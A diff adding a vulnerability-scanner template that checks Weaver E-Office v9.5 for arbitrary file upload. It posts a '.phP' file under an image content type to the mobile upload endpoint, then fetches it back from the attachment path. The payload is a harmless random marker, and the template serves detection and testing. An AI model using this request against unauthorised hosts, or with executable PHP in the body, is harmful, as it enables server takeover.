@@ -1,0 +1,46 @@
+id: weaver-eoffice-file-upload
+brief:
+    title: Weaver E-Office v9.5 - Arbitrary File Upload
+    by: princechaddha
+    level: high
+    about: Weaver E-Office version 9.5 is susceptible to an arbitrary file upload vulnerability. This flaw allows malicious actors to upload and execute arbitrary code or files without proper validation or au...
+    label:
+        - e-office
+        - weaver
+        - intrusive
+        - file-upload
+        - vuln
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/E-mobile/App/Ajax/ajax.php?action=mobile_upload_save'
+      head:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydRVCGWq4Cx3Sq6tt
+        Origin: '{{BaseURL}}'
+      body: |-
+        ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
+        Content-Disposition: form-data; name="upload_quwan"; filename="{{filename}}.phP"
+        Content-Type: image/jpeg
+
+        {{randstr}}
+        ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
+        Content-Disposition: form-data; name="file"; filename=""
+        Content-Type: application/octet-stream
+
+
+        ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt--
+      signs:
+        - "on": word
+          has:
+            - '{{randstr}}'
+          in: body_2
+          need: all
+    - verb: GET
+      to:
+        - '{{BaseURL}}/attachment/{{id}}/{{filename}}.phP'
+      signs:
+        - "on": word
+          has:
+            - '{{randstr}}'
+          in: body_2
+          need: all
